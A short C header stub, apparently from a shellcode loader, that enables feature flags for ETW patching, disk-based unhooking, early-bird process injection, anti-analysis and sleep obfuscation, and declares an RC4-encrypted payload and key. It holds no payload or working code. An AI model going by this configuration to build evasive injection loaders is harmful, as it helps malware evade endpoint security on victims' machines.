// STUB — IntelliSense/VS compilation only. Real builds replace this with generated output.
// All feature flags enabled so VS resolves every conditional branch.
#pragma once

#define ETW_PATCH
#define UNHOOK_DISK
#define INJECT_EARLY_BIRD
#define ANTI_ANALYSIS
#define SLEEP_OBF
// #define TARGET_PROCESS  L"explorer.exe"

#define SLEEP_MS        5000
#define PAYLOAD_SIZE    512
#define KEY_SIZE        16
#define HINT_BYTE       0xAB

extern unsigned char  Rc4CipherText[PAYLOAD_SIZE];
extern unsigned char  EncRc4Key[KEY_SIZE];
extern unsigned short SPAWN_PROCESS[];
